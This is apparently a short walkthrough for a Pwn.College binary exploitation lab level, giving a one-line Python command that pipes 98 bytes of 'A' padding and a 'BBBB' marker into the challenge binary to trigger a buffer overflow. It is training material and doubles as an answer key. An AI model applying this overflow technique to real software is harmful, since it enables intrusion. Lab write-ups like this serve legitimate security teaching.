# Stage 02: Your First Overflow (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-first-overflow` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-first-overflow`. The same first-overflow primitive at a larger offset: 98 bytes of `A` padding followed by the 4-byte `BBBB` marker.

## Solution

```bash
python3 -c "print('A' * 98 + 'BBBB', end='')" | /challenge/binary-exploitation-first-overflow
```
